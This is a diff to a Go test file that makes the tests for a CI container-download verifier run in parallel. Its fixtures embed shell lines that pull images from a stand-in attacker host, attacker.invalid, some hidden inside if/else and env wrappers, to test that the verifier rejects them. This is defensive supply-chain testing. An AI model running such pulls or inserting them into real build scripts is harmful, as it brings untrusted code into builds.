@@ -6,6 +6,7 @@ import (
 )
 
 func TestVerifyCIContainerDownloadsRejectsAcquisitionInReachableRepositoryScripts(t *testing.T) {
+	t.Parallel()
 	tests := map[string]struct {
 		recipe  string
 		scripts map[string]string
@@ -47,6 +48,7 @@ func TestVerifyCIContainerDownloadsRejectsAcquisitionInReachableRepositoryScript
 }
 
 func TestVerifyCIContainerDownloadsRejectsAcquisitionAddedToSourceBoundWorkflowScript(t *testing.T) {
+	t.Parallel()
 	root := writeCIContainerDownloadsFixture(t)
 	writeFixtureExecutable(t, filepath.Join(root, "scripts", "merge-release-digests.sh"), "#!/usr/bin/env bash\nset -euo pipefail\ndocker pull attacker.invalid/image:pinned\n")
 	if err := VerifyCIContainerDownloads(root); err == nil {
@@ -55,6 +57,7 @@ func TestVerifyCIContainerDownloadsRejectsAcquisitionAddedToSourceBoundWorkflowS
 }
 
 func TestVerifyCIContainerDownloadsTraversesBenignRepositoryScriptCyclesOnce(t *testing.T) {
+	t.Parallel()
 	root := writeCIContainerDownloadsFixture(t)
 	writeFixtureExecutable(t, filepath.Join(root, "scripts", "cycle-a.sh"), "#!/usr/bin/env bash\n./scripts/cycle-b.sh\n")
 	writeFixtureExecutable(t, filepath.Join(root, "scripts", "cycle-b.sh"), "#!/usr/bin/env bash\n./scripts/cycle-a.sh\nprintf 'benign cycle\\n'\n")
@@ -67,6 +70,7 @@ func TestVerifyCIContainerDownloadsTraversesBenignRepositoryScriptCyclesOnce(t *
 }
 
 func TestVerifyCIContainerDownloadsRejectsAcquisitionInShellControlStructures(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"if then Docker pull":         `if true; then docker pull attacker.invalid/image:pinned; fi`,
 		"if then wrapped Buildah":     `if false; then env buildah pull attacker.invalid/image:pinned; else true; fi`,
